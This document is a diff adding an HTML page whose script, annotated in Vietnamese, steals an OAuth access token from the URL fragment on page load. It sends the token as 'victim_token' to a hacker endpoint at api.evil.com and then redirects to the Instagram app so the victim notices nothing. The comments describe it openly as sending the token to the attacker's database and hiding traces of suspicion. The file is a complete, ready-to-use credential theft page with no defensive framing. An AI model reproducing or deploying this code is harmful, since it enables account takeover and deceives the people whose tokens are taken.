@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+    window.onload = function() {
+    // 1. Trích xuất Access Token nằm sau dấu "#" trên thanh địa chỉ (URL)
+    const hash = window.location.hash;
+    
+    if (hash && hash.includes("access_token")) {
+        // Tách chuỗi để lấy chính xác đoạn mã Token
+        const token = new URLSearchParams(hash.replace("#", "?")).get("access_token");
+
+        // 2. Gửi ngầm Token này về cơ sở dữ liệu của hacker qua API Fetch
+        fetch("https://api.evil.com/save-token", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                victim_token: token,
+                timestamp: new Date().toISOString()
+            })
+        })
+        .then(() => {
+            // 3. Gửi thành công -> Lập tức kích hoạt Deep Link để mở app thật (ví dụ: Instagram)
+            // Việc này làm nạn nhân tưởng rằng link chỉ đơn giản là mở Instagram
+            window.location.href = "instagram://"; 
+        })
+        .catch((err) => {
+            // Nếu có lỗi mạng, vẫn ép mở app thật để xóa dấu vết nghi ngờ
+            window.location.href = "instagram://";
+        });
+    } else {
+        // Nếu không có token, điều hướng nạn nhân về trang chủ Instagram thật
+        window.location.href = "https://instagram.com";
+    }
+};
+    </script>
+</body>
+</html>
